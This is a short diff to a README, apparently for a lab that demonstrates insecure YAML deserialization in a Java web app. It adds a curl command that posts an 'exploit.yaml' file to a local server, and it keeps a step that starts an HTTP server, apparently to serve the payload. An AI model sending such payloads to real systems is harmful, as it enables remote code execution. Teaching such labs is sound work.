@@ -22,6 +22,12 @@ Send a get request to serialize object of student class and send yaml as respons
 Send a post request with yaml to read YAML object as custom java object - deserialization
 ![](images/image2.png)
 
+
+## curl command
+```shell
+curl POST --data-binary @/files/exploit.yaml  -H "Content-type: text/x-yaml" http://localhost:8080
+```
+
 ## exploit
 
 Execute `python3 -m http.server 8000` to run the http server
